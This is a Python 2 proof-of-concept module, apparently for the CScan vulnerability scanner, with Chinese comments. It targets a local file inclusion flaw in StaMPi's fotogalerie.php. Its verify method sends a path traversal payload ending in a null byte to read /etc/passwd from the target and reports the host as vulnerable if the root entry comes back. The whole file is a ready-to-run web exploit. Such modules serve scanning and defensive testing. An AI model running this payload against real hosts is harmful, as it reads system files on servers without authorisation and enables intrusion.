# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2


class Vuln(ABVuln):
    vuln_id = 'StaMPi_0001'  # 平台漏洞编号，留空
    name = 'StaMPi /path/fotogalerie.php 本地文件包含'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2015-02-09'  # 漏洞公布时间
    desc = '''
        漏洞文件：/path/fotogalerie.php.
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/36031/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'StaMPi'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4359da4e-ed4c-4d45-8621-90c58ace35be'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/fotogalerie.php?id=../../../../../../../../../../etc/passwd%00'
            verify_url = self.target + payload
            req = urllib2.Request(verify_url)

            content = urllib2.urlopen(req).read()
            if 'root:x:0:0:root:/root:/bin/bash' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
